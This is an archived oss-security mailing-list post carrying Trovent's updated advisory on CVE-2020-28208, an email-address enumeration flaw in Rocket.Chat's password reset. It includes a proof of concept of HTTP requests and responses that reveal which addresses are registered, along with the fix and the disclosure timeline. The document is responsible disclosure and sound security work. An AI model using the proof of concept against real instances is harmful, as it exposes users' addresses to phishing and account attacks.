X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5315" "Wednesday" "13" "January" "2021" "08:29:38" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" "<6cl4XA2FNQGvOMHYmqYlBWrjc3DSOfedPrmY6jQiYx__CIGHh7C3oAUzgNUGz75ASJQ--eLeDFSHfhyNpmp4gCfz7iiB45fnXCeRTa-yjIs=@trovent.io>" "174" "[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil "1" "2021011308:29:38" "[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" (number mark "U       s.pietsch@tr Jan 13  174/5315  " thread-indent "\"[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability\"\n") "<nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>" ("<nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>") nil nil nil nil nil nil nil "[oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1031 invoked by uid 550); 13 Jan 2021 11:36:48 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26561 invoked from network); 13 Jan 2021 08:29:57 -0000
Date: Wed, 13 Jan 2021 08:29:38 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
	s=protonmail2; t=1610526584;
	bh=3e6vvrarDVTHw7hJWGSxPmHGI43SDUO4iX13lpcRe2o=;
	h=Date:To:From:Reply-To:Subject:In-Reply-To:References:From;
	b=gyN17ge+wAd/gttEgAaeaZmdnq0Dloq2cl2VllLQykYANwi8fd8Mp1ZDwH1yaZcZj
	 9qCnBzKTNoKRpZIu/trg7NaijzNcOuA5bK41xadJWgqqVdIjAEeCtiAoONOU7nV0xs
	 ggH47GkJ9j19FsaOQMG69Qg58GmOD0/wVb+harTo8vKj7eUZRKS4S+vkz0ECQ0zvJM
	 1S6yuh60nekz/WuVuRH7CIltmfkgAEBwmeUNKDt6ZlYIK2ROezOLKOuMD39CypCO6i
	 wcQQnHoqxy6/BnXj7XHQVnp6OooLdOG2KOm1AdZbn758lAmh25tTFxPpIZ7szw4Vjv
	 jbeapRK51ML5w==
To: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>, "submissions@packetstormsecurity.com" <submissions@packetstormsecurity.com>
From: Stefan Pietsch <s.pietsch@trovent.io>
Message-ID: <6cl4XA2FNQGvOMHYmqYlBWrjc3DSOfedPrmY6jQiYx__CIGHh7C3oAUzgNUGz75ASJQ--eLeDFSHfhyNpmp4gCfz7iiB45fnXCeRTa-yjIs=@trovent.io>
In-Reply-To: <nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>
References: <nOtVB6IX8HgEDMTZRoSF8T27q70YAYS_B_0y9-R3vMdfdPNlhYXTJ9VZ78Q-K0OVzg4QuofyWufiLNnN-sjThgbinm-sWfVGnPLtJ_ovWL8=@trovent.io>
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="---------------------69a9a24a290b55b1502e2041bd82e263"; charset=utf-8
Subject: [oss-security] Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability

-----------------------69a9a24a290b55b1502e2041bd82e263
Content-Type: multipart/mixed;boundary=---------------------15b77fcdcbcc8e4990cd52f28f9d2c54

-----------------------15b77fcdcbcc8e4990cd52f28f9d2c54
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;charset=utf-8

# Trovent Security Advisory 2010-01 #
#####################################


Email address enumeration in reset password
###########################################


Overview
########

Advisory ID: TRSA-2010-01
Advisory version: 1.2
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2010-01
Affected product: Web application Rocket.Chat
Affected version: <=3D 3.9.1
Vendor: Rocket.Chat Technologies Corp., https://rocket.chat
Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch


Detailed description
####################

Trovent Security GmbH discovered an email address enumeration vulnerability
in the password reset function of the chat application Rocket.Chat. This vu=
lnerability lets
an unauthorized user enumerate registered email addresses on the instance o=
f Rocket.Chat.

Severity: Medium
CVSS Score: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
CVE ID: CVE-2020-28208
CWE ID: CWE-204


Proof of concept
################

Sample HTTP request sent with a registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 122
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
rams\":[\"positive@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

The server response to a valid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:01:25 GMT
Connection: keep-alive
Content-Length: 78

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":tr=
ue}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

Sample HTTP request sent with a non registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 119
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
rams\":[\"false@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

The server response to an invalid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:03:08 GMT
Connection: keep-alive
Content-Length: 79

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":t=
rue}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


Solution / Workaround
#####################

Ensure the application returns consistent generic server responses independ=
ent
of the email address entered during the password reset process.

Fixed in Rocket.Chat version 3.9.2, verified by Trovent.


History
#######

2020-10-27: Vulnerability found
2020-11-03: Advisory created and CVE ID requested
2020-11-06: Vendor contacted and informed about planned disclosure date
2020-11-06: Vendor confirmed vulnerability, working on a fix
2021-01-07: Advisory published
2021-01-08: Vendor sent us information about fixed version
2021-01-13: Updated affected version (thanks @LorenzNickel), verified with =
3.9.1

-----------------------15b77fcdcbcc8e4990cd52f28f9d2c54--

-----------------------69a9a24a290b55b1502e2041bd82e263
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: ProtonMail

wsFzBAEBCAAGBQJf/q9eACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
/h6FjrdPwBAAl31mzhGO4GAxwHoJp9OK3ruh0Qe9P4h2TDkkIYWZKsBS1IMU
eRct1DqGa1EFX11xK/1PVqvVi13pJG11IvJ3Hz5t7En6qEkazJCLgbDbKm9i
I1Fu1y/6eIATPOxOksNMCTse7laY/2OMukVsLizNZ+kSOw2pg+Ur7nF5Qe9a
Bm7KPzThlmRIma0OhSZOZpvorNIcgFD3TSSbrq0ojqPa+b434nQsJBVqEvZF
Gij1i7aNI2C3xmAjvv6+ZqRNPrKPBpbziiSqB3TswVBclDxH8Q9yDE37/NX2
SvfePeu6vBvYhy12RhsZ+WUze57l578Lf+bx/0B5ha+wNGIUoTjOSqoPvFjf
vdpgNvzLxOh6EB/Qh1tSzRX03nsesb8cpG5Fr8pduRmu6M7rfL8ytud6n60K
d+sjZxD1ecnfBXi3MwxNe1IEXAyqChUSXC5RhGPJP1F+AEm+Ap8t3+7dkRYe
gve4Lyhqb4N0BCe1N76W1L10Yqh7QU9Cc/wXZdul+JwstuaMpjmngK+QXSpk
++2Pc9jRpdTqFb/mNRXJI8XBnagJfUYp0MHVuwp1ZMLVLeXdYy5MrI2lh0lg
Amh7US0RRvI0vSJ6LqEuyeblVXokm5N2e9zCzWeDV/IK0azQe0qMlH33qrnm
+/5zHr3ZFCUioaicCm4lLkSpzxJ/bHumaAQ=
=NSTc
-----END PGP SIGNATURE-----


-----------------------69a9a24a290b55b1502e2041bd82e263--

